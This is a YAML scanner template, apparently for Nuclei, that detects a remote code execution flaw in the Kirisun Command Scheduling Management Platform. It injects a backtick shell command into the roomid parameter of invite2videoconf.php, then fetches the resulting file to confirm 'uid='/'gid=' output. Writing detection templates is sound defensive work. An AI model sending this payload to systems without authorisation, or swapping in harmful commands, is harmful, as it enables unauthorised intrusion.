id: kirisun-command-scheduling-invite2videoconf-rce
info:
  name: Kirisun Command Scheduling Management Platform invite2videoconf.php RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    Remote Code Execution vulnerability in Kirisun Command Scheduling Management Platform via invite2videoconf.php.

variables:
  t1: "{{rand_base(6)}}"

flow: |
  http(1) && http(2)

http:
  - id: check-vulnerability
    method: GET
    path:
      - "/api/client/invite2videoconf.php?callee=1&roomid=`id>{{t1}}.txt`"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success"

  - id: verify-execution
    method: GET
    path:
      - "/api/client/{{t1}}.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid="
          - "gid="
      - type: word
        words:
          - "<"
        negative: true
